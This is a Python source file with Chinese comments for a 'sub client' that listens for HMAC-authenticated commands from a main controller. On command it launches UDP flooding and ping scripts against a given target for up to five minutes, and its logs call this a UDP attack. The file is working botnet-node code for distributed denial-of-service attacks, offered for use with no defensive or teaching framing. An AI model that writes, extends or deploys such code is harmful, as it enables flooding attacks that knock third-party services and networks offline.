#!/usr/bin/env python3
import socket
import threading
import json
import subprocess
import hashlib
import hmac
import datetime
import signal
import os

# 加载子端配置文件
with open('config_sub.json', 'r') as f:
    config = json.load(f)

MY_PORT = config['sub_client']['port']
MAIN_IP = config['main_client']['ip']
MAIN_PORT = config['main_client']['port']
PSK = config['psk'].encode('utf-8')

# 全局进程列表
running_processes = []
process_lock = threading.Lock()

# HMAC-SHA256 认证函数
def create_hmac(message):
    return hmac.new(PSK, message.encode('utf-8'), hashlib.sha256).digest()

def verify_hmac(message, received_hmac):
    expected_hmac = create_hmac(message)
    return hmac.compare_digest(expected_hmac, received_hmac)

# 强制终止进程
def terminate_processes():
    with process_lock:
        for p in running_processes:
            try:
                os.kill(p.pid, signal.SIGKILL)  # 使用 SIGKILL 强制终止
                p.wait(timeout=1)
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Terminated process PID {p.pid}")
            except:
                pass
        running_processes.clear()

# 处理客户端连接
def handle_client(conn, addr):
    try:
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 来自 {addr[0]}:{addr[1]} 的连接")
        conn.settimeout(5)
        data = conn.recv(1024)
        if len(data) < 32:
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 接收到无效数据，长度不足")
            conn.sendall(create_hmac('error') + 'error: invalid data'.encode('utf-8'))
            return
        
        received_hmac = data[:32]
        message = data[32:].decode('utf-8')
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 收到命令: {message}")
        
        if verify_hmac(message, received_hmac):
            if message == 'heartbeat':
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 处理心跳请求")
                conn.sendall(create_hmac('ack') + 'ack'.encode('utf-8'))
            elif message.startswith('udp '):
                terminate_processes()  # 清理旧进程
                parts = message.split()
                if len(parts) == 4 and parts[0] == 'udp':
                    _, target, packet_size, rate_mbps = parts
                    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 执行UDP攻击: 目标={target}, 数据包大小={packet_size}, 速率={rate_mbps}")
                    p = subprocess.Popen(['python3', 'udp.py', target, packet_size, rate_mbps])
                    ping_p = subprocess.Popen(['python3', 'ping.py', target])
                    with process_lock:
                        running_processes.extend([p, ping_p])
                    try:
                        p.wait(timeout=300)  # 5分钟超时
                    except subprocess.TimeoutExpired:
                        terminate_processes()
                    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] UDP攻击完成")
                    conn.sendall(create_hmac('done') + 'done'.encode('utf-8'))
                else:
                    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 无效的UDP命令格式")
                    conn.sendall(create_hmac('error') + 'error: invalid udp command'.encode('utf-8'))
            elif message == 'stop':
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 收到停止命令")
                terminate_processes()
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 所有进程已终止")
                conn.sendall(create_hmac('stopped') + 'stopped'.encode('utf-8'))
            else:
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 未知命令: {message}")
                conn.sendall(create_hmac('error') + 'error: unknown command'.encode('utf-8'))
        else:
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] HMAC验证失败")
            conn.sendall(create_hmac('error') + 'error: HMAC verification failed'.encode('utf-8'))
    except socket.timeout:
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 连接 {addr[0]}:{addr[1]} 超时")
    except Exception as e:
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 处理命令时出错: {e}")
        conn.sendall(create_hmac('error') + f'error: {str(e)}'.encode('utf-8'))
    finally:
        conn.close()

# 服务器设置
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(('0.0.0.0', MY_PORT))
server.listen(5)
print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 子客户端监听端口 {MY_PORT}...")

try:
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
except KeyboardInterrupt:
    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 收到 Ctrl+C，正在关闭服务器...")
    terminate_processes()
    server.close()
    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 服务器已关闭，端口已释放。")
except Exception as e:
    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 服务器错误: {e}")
    terminate_processes()
    server.close()
finally:
    server.close()